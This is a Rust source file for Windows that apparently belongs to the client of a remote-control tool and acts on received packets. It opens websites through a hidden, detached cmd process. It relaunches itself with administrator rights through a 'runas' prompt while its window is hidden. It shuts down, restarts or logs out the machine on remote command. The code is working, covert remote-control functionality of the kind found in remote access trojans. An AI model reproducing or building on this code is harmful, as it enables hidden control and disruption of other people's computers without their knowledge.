use std::ptr;
use std::ffi::OsStr;
use std::os::windows::{process::CommandExt, ffi::OsStrExt};
use winapi::um::shellapi::ShellExecuteW;
use winapi::um::winuser::SW_HIDE;
use winapi::shared::minwindef::UINT;
use crate::service::install::is_elevated;
use common::packets::VisitWebsiteData;


pub fn visit_website(
    visit_data: &VisitWebsiteData
) {
    let visit_type = visit_data.visit_type.as_str();
    let url = visit_data.url.as_str();

    const DETACH: u32 = 0x00000008;
    const HIDE: u32 = 0x08000000;

    if visit_type == "normal" {
        //println!("Opening URL: {}", url);
        std::process::Command
            ::new("cmd")
            .args(["/C", "start", url])
            .creation_flags(HIDE | DETACH)
            .spawn()
            .unwrap();
    }
}



pub fn elevate_client() {
    if is_elevated() {
        return;
    }

    crate::MUTEX_SERVICE.lock().unwrap().unlock();

    let exe = std::env::current_exe().unwrap();
    let path = exe.to_str().unwrap();

    let operation = OsStr::new("runas");
    let path_os = OsStr::new(path);
    let operation_encoded: Vec<u16> = operation.encode_wide().chain(Some(0)).collect();
    let path_encoded: Vec<u16> = path_os.encode_wide().chain(Some(0)).collect();

    unsafe {
        let h_instance = ShellExecuteW(
            ptr::null_mut(),
            operation_encoded.as_ptr(),
            path_encoded.as_ptr(),
            ptr::null(),
            ptr::null(),
            SW_HIDE
        );

        if (h_instance as UINT) > 32 {
            std::process::exit(1);
        } else {
            crate::MUTEX_SERVICE.lock().unwrap().lock();
        }
    }
}

const HIDE: u32 = 0x08000000;

pub fn system_commands(command: &str) {
    
    match command {
        "shutdown" => run_command("shutdown", &["/s", "/t", "0"]),
        "logout" => run_command("shutdown", &["/l"]),
        "restart" => run_command("shutdown", &["/r", "/t", "0"]),
        _ => {}
    }
}

pub fn run_command(command: &str, args: &[&str]) {
    let _ = std::process::Command
        ::new(command)
        .creation_flags(HIDE)
        .args(args)
        .spawn()
        .expect("Failed to run command").wait();
}

